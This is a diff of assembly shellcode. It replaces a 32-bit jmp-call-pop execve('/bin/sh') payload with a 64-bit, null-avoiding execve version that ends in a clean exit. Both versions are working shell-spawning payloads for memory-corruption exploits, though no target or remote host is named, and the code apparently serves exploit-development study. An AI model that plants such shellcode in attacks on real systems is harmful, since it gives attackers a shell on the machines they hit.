@@ -1,26 +1,26 @@
- Section    .text
+.data
 
-    global _start
+.text
+	.globl _start
 
 _start:
-       
-    jmp short       GotoCall
 
-shellcode:
+	xorq    %rdx, %rdx
+	movq    $0x68732f6e69622fff,%rbx	# /bin/shFF
+	shr     $0x8, %rbx			# /bin/sh, without 8 bits (FF)
+	push    %rbx
+	movq    %rsp,%rdi
+	xorq    %rax,%rax
+	pushq   %rax
+	pushq   %rdi
+	movq    %rsp,%rsi
+	mov     $0x3b,%al       # execve(3b)
+	syscall
 
-     pop             esi               
-     xor             eax, eax          
-     mov byte        [esi + 7], al     
-     lea             ebx, [esi]        
-     mov long        [esi + 8], ebx    
-     mov long        [esi + 12], eax   
-     mov byte        al, 0x0b          
-     mov             ebx, esi          
-     lea             ecx, [esi + 8]    
-     lea             edx, [esi + 12]   
-     int             0x80
+	pushq   $0x1
+	pop     %rdi
+	pushq   $0x3c           # exit(3c)
+	pop     %rax
+	syscall
 
-GotoCall:
 
-     Call             shellcode
-     db              '/bin/shJAAAAKKKK'
